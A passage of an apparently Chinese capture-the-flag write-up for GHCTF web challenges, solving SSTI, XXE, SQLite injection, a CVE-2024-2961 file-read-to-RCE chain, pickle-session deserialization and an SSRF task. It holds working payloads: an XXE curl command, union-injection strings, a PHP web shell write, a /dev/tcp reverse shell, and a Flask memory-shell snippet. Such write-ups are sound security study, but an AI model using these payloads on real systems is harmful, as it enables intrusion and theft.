exec_cmd_payload, config_payload</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> blacklist)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    shell_payload, _ = exec_cmd_payload(waf, <span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">    <span class="comment"># config_payload = config_payload(waf)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># print(f&quot;&#123;config_payload=&#125;&quot;)</span></span><br></pre></td></tr></table></figure><p>然后就是抓包改一个文件名<code>xxx.md</code>，内容为上面的<code>payload</code>，之后<strong>访问<code>/file/xxx.md</code></strong></p><h2 id="gt-﹏-lt"><a href="#gt-﹏-lt" class="headerlink" title="(&gt;﹏&lt;)"></a>(&gt;﹏&lt;)</h2><p><strong>无过滤<code>xxe</code></strong><br><code>curl -X POST http://node2.anna.nssctf.cn:28796/ghctf --data-urlencode &#39;xml=&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;&#39;</code></p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL???"></a>SQL???</h2><p><code>id=1 order by 6</code>判断列数为5，然后习惯性查<code>database()</code>，没查到，原来是<strong>sqlite注入</strong>(题目算个提示)</p><p><code>id=1 union select 1,2,3,4,(select sql from sqlite_master)--</code>，查到表名和列名</p><p><code>id=1 union select 1,2,3,4,(select group_concat(flag) from flag)--</code>，查到数据</p><p><code>emmm</code>，据说<code>sqlmap</code>的话要开<code>--random-agent</code>，好防，我好像也没跑出来</p><h2 id="ez-readfile"><a href="#ez-readfile" class="headerlink" title="ez_readfile"></a>ez_readfile</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>奇怪，网上找的字符串，强碰撞<code>yakit,bp</code>这些都发包不成功导致了读不到文件，然后下面是当时打<code>SHCTF2024</code><strong>fastcoll</strong>生成的文件</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg1.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg2.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    b = f.read()</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: a,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28002/?file=/etc/passwd&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>通过<code>file_get_contents</code>实现命令执行，可以参考这篇去年5月份就发的<a href="https://mp.weixin.qq.com/s/03Bq8iryo22Cme5QR0LqDw">cve-2024-2961</a>，然后是<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18296185">春秋杯夏季赛</a>，说实话不关注这些东西，真不好在网上慢慢找</p><p>这里用到的是<a href="https://github.com/kezibei/php-filter-iconv">kezibei的脚本</a><br>修改一下payload，<code>cmd = &quot;echo &#39;&lt;?php system($_GET[\&quot;cmd\&quot;]); ?&gt;&#39; &gt; /var/www/html/shell.php&quot;</code></p><p>这里我们需要有<code>maps</code>和<code>libc.so</code>(路径翻一下前者即可得到)文件(跟上面的脚本放在同一目录下即可)，前者直接下载复制保存即可，后者因为响应里面还有页面信息，而且内容较大，得保存到文件中，再删除掉文件前面的东西即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># maps</span></span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28002/?file=/proc/self/maps&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc.so</span></span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28002/?file=/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\CVE\\cve-2024-2961-LFI\\php-filter-iconv\\libc-2.31.so&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(res.content)</span><br></pre></td></tr></table></figure><p>然后在有<strong>pwn环境的主机</strong>中运行<code>php-filter-iconv.py</code>即可，我这里用的是<strong>wsl2+ubuntu22.04</strong>，把<code>payload</code>打入上面的<code>exp</code>，访问题目<strong>url/shell.php?cmd=cat /f*</strong>即可</p><p>看了官方<code>wp</code>，居然有非预期<br><img src="https://pic1.zhimg.com/80/v2-4acc0d17eeae51da2f768b337c31295c_1440w.png" alt=""><br>读取，<strong>/docker-entrypoint.sh</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check the environment variables for the flag and assign to INSERT_FLAG</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$DASFLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$DASFLAG</span>&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$GZCTF_FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$GZCTF_FLAG</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;flag&#123;TEST_Dynamic_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将FLAG写入文件 请根据需要修改</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INSERT_FLAG</span> &gt; /f1wlxekj1lwjek1lkejzs1lwje1lwesjk1wldejlk1wcejl1kwjelk1wjcle1jklwecj1lkwcjel1kwjel1cwjl1jwlkew1jclkej1wlkcj1lkwej1lkcwjellag</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/apache2/envvars</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running...&quot;</span> &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> -F /var/log/apache2/* &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> apache2 -D FOREGROUND</span><br></pre></td></tr></table></figure><h2 id="ezzzz-pickle"><a href="#ezzzz-pickle" class="headerlink" title="ezzzz_pickle"></a>ezzzz_pickle</h2><p>直接爆破<strong>admin</strong>的密码得到<strong>admin123</strong></p><p><code>POST</code>参数发现可以<strong>任意文件读取</strong>，我们直接读<strong>源文件/app/app.py</strong><br>页面源代码还给了个提示，<strong>session_pickle</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /app/app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, make_response,render_template</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_iv</span>():</span><br><span class="line">    key = os.environ.get(<span class="string">&#x27;SECRET_key&#x27;</span>).encode()</span><br><span class="line">    iv = os.environ.get(<span class="string">&#x27;SECRET_iv&#x27;</span>).encode()</span><br><span class="line">    <span class="keyword">return</span> key, iv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt_decrypt</span>(<span class="params">data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span></span>):</span><br><span class="line"></span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">        encryptor = cipher.encryptor()</span><br><span class="line"></span><br><span class="line">        padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">        padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">        result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(result).decode()  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;decrypt&#x27;</span>:</span><br><span class="line">        decryptor = cipher.decryptor()</span><br><span class="line"></span><br><span class="line">        encrypted_data_bytes = base64.b64decode(data)</span><br><span class="line">        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()</span><br><span class="line"></span><br><span class="line">        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</span><br><span class="line">        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">        <span class="keyword">return</span> unpadded_data.decode()</span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;admin123&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_session</span>(<span class="params">username</span>):</span><br><span class="line"></span><br><span class="line">    session_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;expires&quot;</span>: time.time() + <span class="number">3600</span>  </span><br><span class="line">    &#125;</span><br><span class="line">    pickled = pickle.dumps(session_data)</span><br><span class="line">    pickled_data = base64.b64encode(pickled).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    key,iv=generate_key_iv()</span><br><span class="line">    session=aes_encrypt_decrypt(pickled_data, key, iv,mode=<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dowload_file</span>(<span class="params">filename</span>):</span><br><span class="line">    path=os.path.join(<span class="string">&quot;static&quot;</span>,filename)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data=f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_session</span>(<span class="params">cookie</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key, iv = generate_key_iv()</span><br><span class="line">        pickled = aes_encrypt_decrypt(cookie, key, iv,mode=<span class="string">&#x27;decrypt&#x27;</span>)</span><br><span class="line">        pickled_data=base64.b64decode(pickled)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        session_data = pickle.loads(pickled_data)</span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&quot;username&quot;</span>] !=<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> session_data <span class="keyword">if</span> session_data[<span class="string">&quot;expires&quot;</span>] &gt; time.time() <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;session&quot;</span> <span class="keyword">in</span> request.cookies:</span><br><span class="line">        session = validate_session(request.cookies[<span class="string">&quot;session&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> session:</span><br><span class="line">            data=<span class="string">&quot;&quot;</span></span><br><span class="line">            filename=request.form.get(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(filename):</span><br><span class="line">                data=dowload_file(filename)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session[<span class="string">&#x27;username&#x27;</span>],file_data=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> users.get(username) == password:</span><br><span class="line">            resp = make_response(redirect(<span class="string">&quot;/&quot;</span>))</span><br><span class="line"></span><br><span class="line">            resp.set_cookie(<span class="string">&quot;session&quot;</span>, create_session(username))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>,error=<span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = make_response(redirect(<span class="string">&quot;/login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;session&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>通过<code>create_session()</code>函数，我们知道<strong>session数据</strong>经过了<strong>pickle序列化</strong>+<strong>base64编码</strong>+<strong>AES加密</strong></p><p>这里<code>aes加解密</code>需要<strong>key、iv</strong>，而且是从<strong>环境变量</strong>获取的，我们可以直接<strong>读/proc/self/environ</strong>，得到</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PYTHON_SHA256=bfb249609990220491a1b92850a07135ed0831e41738cf681d63cf01b2a8fbd1</span><br><span class="line">HOSTNAME=ab49bc3fc05a4391</span><br><span class="line">PYTHON_VERSION=3.10.16</span><br><span class="line">PWD=/app</span><br><span class="line">HOME=/root</span><br><span class="line">LANG=C.UTF-8</span><br><span class="line">GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D</span><br><span class="line">FLAG=no_FLAG</span><br><span class="line">SECRET_key=ajwdopldwjdowpajdmslkmwjrfhgnbbv</span><br><span class="line">SHLVL=1</span><br><span class="line">PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">SECRET_iv=asdwdggiouewhgpw</span><br><span class="line">_=/usr/local/bin/flask</span><br><span class="line">OLDPWD=/</span><br></pre></td></tr></table></figure><p>参照题目脚本，挫一下<code>exp</code>，因为没有回显，所以直接读是读不出来的</p><p>下面有三种方向，<strong>反弹shell、覆盖/追加写、内存马</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">data, key, iv</span>):</span><br><span class="line"></span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv),</span><br><span class="line">                    backend=default_backend())</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line"></span><br><span class="line">    padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">    padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">    result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(result).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;ajwdopldwjdowpajdmslkmwjrfhgnbbv&#x27;</span></span><br><span class="line">iv = <span class="string">b&#x27;asdwdggiouewhgpw&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;cat /flag* &gt; /app/app.py&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickled_data = base64.b64encode(data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># class RCE():</span></span><br><span class="line"><span class="comment">#     def __reduce__(self):</span></span><br><span class="line"><span class="comment">#         return (exec, (&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;,))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pickled_data = base64.b64encode(pickle.dumps(RCE())).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line"></span><br><span class="line">session = aes_encrypt(pickled_data, key, iv)</span><br><span class="line">url = <span class="string">&#x27;http://node6.anna.nssctf.cn:24514/&#x27;</span></span><br><span class="line">res = requests.post(url, cookies=&#123;<span class="string">&#x27;session&#x27;</span>: session&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="comment"># http://node6.anna.nssctf.cn:24514/xxx?cmd=ls /</span></span><br></pre></td></tr></table></figure><p>官方<code>wp</code>这里用的就是<a href="https://blog.csdn.net/2301_79724395/article/details/139094906">内存马</a></p><h2 id="Goph3rrr"><a href="#Goph3rrr" class="headerlink" title="Goph3rrr"></a>Goph3rrr</h2><p>什么信息都收集不到，直接<strong>扫目录</strong>，拿到<code>/app.py</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunparse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">BlackList = [</span><br><span class="line">    <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27; ... &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username][<span class="string">&#x27;password&#x27;</span>] == hashlib.md5(password.encode()).hexdigest():</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">f&quot;Welcome back, <span class="subst">&#123;username&#125;</span>!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;Invalid credentials!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;...&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Gopher&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No url provided :)&quot;</span></span><br><span class="line">    url = urlparse(url)</span><br><span class="line">    realIpAddress = socket.gethostbyname(url.hostname)</span><br><span class="line">    <span class="keyword">if</span> url.scheme == <span class="string">&quot;file&quot;</span> <span class="keyword">or</span> realIpAddress <span class="keyword">in</span> BlackList:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No (≧∇≦)&quot;</span></span><br><span class="line">    result = subprocess.run([<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;-L&quot;</span>, urlunparse(url)], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> result.stdout</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/RRegister&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;Username already exists!&quot;</span>)</span><br><span class="line">        users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: hashlib.md5(password.encode()).hexdigest()&#125;</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;Registration successful!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;...&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Manage&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>():</span><br><span class="line">    <span class="keyword">if</span> request.remote_addr != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Forbidden!!!&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Allowed!!!&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> os.popen(request.form.get(<span class="string">&quot;cmd&quot;</span>)).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_avatar</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;User not found!&quot;</span>)</span><br><span class="line">        file = request.files.get(<span class="string">&#x27;avatar&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> file:</span><br><span class="line">            file.save(os.path.join(avatar_dir, <span class="string">f&quot;<span class="subst">&#123;username&#125;</span>.png&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;Avatar uploaded successfully!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;No file uploaded!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;...&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/app.py&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__, as_attachment=<span 